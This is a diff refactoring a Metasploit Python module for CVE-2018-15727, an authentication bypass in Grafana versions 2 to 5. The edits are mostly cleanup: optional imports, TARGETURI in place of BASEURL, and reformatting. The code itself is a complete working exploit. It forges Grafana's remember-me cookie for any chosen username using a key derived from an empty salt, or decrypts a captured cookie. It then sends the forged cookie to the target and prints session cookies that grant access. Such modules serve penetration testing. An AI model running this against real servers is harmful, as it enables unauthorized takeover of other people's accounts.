@@ -2,8 +2,6 @@
 # -*- coding: utf-8 -*-
 
 # standard modules
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-import requests 
 import binascii
 import hashlib
 import logging
@@ -11,6 +9,19 @@ import os
 import re
 
 from metasploit import module
+
+# extra modules
+dependencies_requests_missing = False
+try:
+    import requests
+except ImportError:
+    dependencies_requests_missing = True
+
+dependencies_cryptography_missing = False
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+except ImportError:
+    dependencies_cryptography_missing = True
 
 
 metadata = {
@@ -22,9 +33,9 @@ metadata = {
     ''',
     'authors': [
         'Rene Riedling',
-        'Sebastian Solnica' #Original Discovered
+        'Sebastian Solnica'  # Original Discovered
     ],
-    'date': '2019-08-14', # set to date of creation
+    'date': '2019-08-14',  # set to date of creation
     'license': 'MSF_LICENSE',
     'references': [
         {'type': 'cve', 'ref': '2018-15727'},
@@ -33,19 +44,19 @@ metadata = {
     ],
     'type': 'single_scanner',
     'options': {
-        'VERSION': {'type': 'string', 'description': 'Grafana version', 'required': True, 'default': '5'},
+        'VERSION': {'type': 'string', 'description': 'Grafana version: "5" or "2-4"', 'required': True, 'default': '5'},
         'USERNAME': {'type': 'string', 'description': 'Valid username', 'required': False},
         'RHOSTS': {'type': 'address', 'description': 'Address of target', 'required': True, 'default': '127.0.0.1'},
         'RPORT': {'type': 'port', 'description': 'Port of target', 'required': True, 'default': 3000},
         'COOKIE': {'type': 'string', 'description': 'Decrypt captured cookie', 'required': False},
-        'BASEURL': {'type': 'string', 'description': 'Base URL of grafana instance', 'required': False, 'default' : '/'},
-        'SSL': {'type': 'bool', 'description': 'set SSL/TLS based connection', 'required': True, 'default' : False}
+        'TARGETURI': {'type': 'string', 'description': 'Base URL of grafana instance', 'required': False, 'default': '/'},
+        'SSL': {'type': 'bool', 'description': 'set SSL/TLS based connection', 'required': True, 'default': False}
     }
 }
 
 
 def encrypt_version5(username):
-    
+
     salt = b''
     iterations = 1000
     key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
@@ -53,7 +64,8 @@ def encrypt_version5(username):
     nonce = os.urandom(12)
     username = username.encode()
     ct = aesgcm.encrypt(nonce, username, None)
-    cookie = str(binascii.hexlify(nonce),'ascii')+str(binascii.hexlify(ct),'ascii')
+    cookie = str(binascii.hexlify(nonce), 'ascii') + \
+        str(binascii.hexlify(ct), 'ascii')
     return cookie
 
 
@@ -66,19 +78,20 @@ def encrypt_version4(username):
     nonce = os.urandom(12)
     username = username.encode()
     ct = aesgcm.encrypt(nonce, username, None)
-    cookie = str(binascii.hexlify(nonce),'ascii')+str(binascii.hexlify(ct),'ascii')
+    cookie = str(binascii.hexlify(nonce), 'ascii') + \
+        str(binascii.hexlify(ct), 'ascii')
     return cookie
 
 
 def decrypt_version5(cookie):
-    
+
     salt = b''
     iterations = 1000
     key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
     aesgcm = AESGCM(key)
     nonce = binascii.unhexlify(cookie[:24])
     ct = binascii.unhexlify(cookie[24:len(cookie)])
-    username = str(aesgcm.decrypt(nonce, ct, None),'ascii')
+    username = str(aesgcm.decrypt(nonce, ct, None), 'ascii')
     return username
 
 
@@ -90,22 +103,28 @@ def decrypt_version4(cookie):
     aesgcm = AESGCM(key)
     nonce = binascii.unhexlify(cookie[:24])
     ct = binascii.unhexlify(cookie[24:len(cookie)])
-    username = str(aesgcm.decrypt(nonce, ct, None),'ascii')
+    username = str(aesgcm.decrypt(nonce, ct, None), 'ascii')
     return username
 
 
-
-
 def run(args):
-   
 
-    if int(args['VERSION']) == 5:
-        try:    
+    if dependencies_requests_missing:
+        logging.error('Module dependency (requests) is missing, cannot continue')
+        return
+    
+    if dependencies_cryptography_missing:
+        logging.error('Module dependency (cryptography) is missing, cannot continue')
+        return
+    
+    if args['VERSION'] == "5":
+        try:
             username = args['USERNAME']
             cookie = encrypt_version5(args['USERNAME'])
             module.log("Encrypted remember cookie: "+cookie, "good")
         except:
-            module.log("No username set, trying to decrypt it from cookie.", "warning")
+            module.log(
+                "No username set, trying to decrypt it from cookie.", "warning")
             try:
                 username = decrypt_version5(args['COOKIE'])
                 module.log("Decrypted username: "+username, "good")
@@ -113,13 +132,14 @@ def run(args):
             except:
                 module.log("Unable to set username", "error")
                 return
-    elif int(args['VERSION']) <= 4 and int(args['VERSION']) >= 2:
-        try:    
+    elif args['VERSION'] == "2-4":
+        try:
             username = args['USERNAME']
             cookie = encrypt_version4(args['USERNAME'])
             module.log("Encrypted remember cookie: "+cookie, "good")
         except:
-            module.log("No username set, trying to decrypt it from cookie.", "warning")
+            module.log(
+                "No username set, trying to decrypt it from cookie.", "warning")
             try:
                 username = decrypt_version4(args['COOKIE'])
                 module.log("Decrypted username: "+username, "good")
@@ -128,47 +148,52 @@ def run(args):
                 module.log("Unable to set username", "error")
                 return
     else:
-        module.log("Version not supported.","error")
-
+        module.log("Version not supported.", "error")
 
     try:
-        cookies = { 'grafana_remember':cookie, 'grafana_user':username }
-        
+        cookies = {'grafana_remember': cookie, 'grafana_user': username}
+
         if args['SSL'] == "false":
-            if args['BASEURL'].endswith('/'): 
-                url="http://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"login/"
+            if args['TARGETURI'].endswith('/'):
+                url = "http://"+args['RHOSTS']+":" + \
+                    args['RPORT']+args['TARGETURI']+"login/"
             else:
-                url="http://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"/login/"
+                url = "http://"+args['RHOSTS']+":" + \
+                    args['RPORT']+args['TARGETURI']+"/login/"
         elif args['SSL'] == "true":
-            if args['BASEURL'].endswith('/'): 
-                url="https://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"login/"
+            if args['TARGETURI'].endswith('/'):
+                url = "https://"+args['RHOSTS']+":" + \
+                    args['RPORT']+args['TARGETURI']+"login/"
             else:
-                url="https://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"/login/"
-        module.log(url, "error")
+                url = "https://"+args['RHOSTS']+":" + \
+                    args['RPORT']+args['TARGETURI']+"/login/"
+        module.log('Targeting URL: ' + url, 'debug')
         r = requests.get(url=url, cookies=cookies, allow_redirects=False)
-    
+
     except:
         module.log("Failed to sending request to host.", "error")
         return
 
-
     if r.status_code == 302:
         try:
-            grafana_user = re.search(r"grafana_user=.*?;",r.headers['Set-Cookie']).group(0)
-            grafana_remember = re.search(r"grafana_remember=.*?;",r.headers['Set-Cookie']).group(0)
-            grafana_sess = re.search(r"grafana_sess=.*?;",r.headers['Set-Cookie']).group(0)
-    
-            module.log("Set following cookies to get access to the grafana instance.","good")
-            module.log(grafana_user,"good")
-            module.log(grafana_remember,"good")
-            module.log(grafana_sess,"good")
-        except: 
+            grafana_user = re.search(
+                r"grafana_user=.*?;", r.headers['Set-Cookie']).group(0)
+            grafana_remember = re.search(
+                r"grafana_remember=.*?;", r.headers['Set-Cookie']).group(0)
+            grafana_sess = re.search(
+                r"grafana_sess=.*?;", r.headers['Set-Cookie']).group(0)
+
+            module.log(
+                "Set following cookies to get access to the grafana instance.", "good")
+            module.log(grafana_user, "good")
+            module.log(grafana_remember, "good")
+            module.log(grafana_sess, "good")
+        except:
             module.log("Failed to generate cookies out of request.", "error")
             return
     else:
-        module.log("Target is not vulnerable.","warning")
+        module.log("Target is not vulnerable.", "warning")
         return
-
 
 
 if __name__ == '__main__':
